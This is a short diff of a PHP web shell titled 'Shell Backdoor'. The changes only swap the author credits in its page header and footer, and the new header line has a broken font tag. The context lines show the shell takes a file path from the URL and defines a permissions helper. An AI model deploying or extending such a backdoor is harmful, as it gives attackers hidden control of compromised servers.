@@ -46,7 +46,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="red">Shell Backdoor By Tn.David</font></center></h1>
+<h1><center><font color="red">Shell Backdoor By Trhacknon /font></center></h1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font> ';
 if(isset($_GET['path'])){
@@ -229,7 +229,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/>Mr Xcody404</center>
+echo '<center><br/>Mr trhacknon</center>
 </body>
 </html>';
 function perms($file){
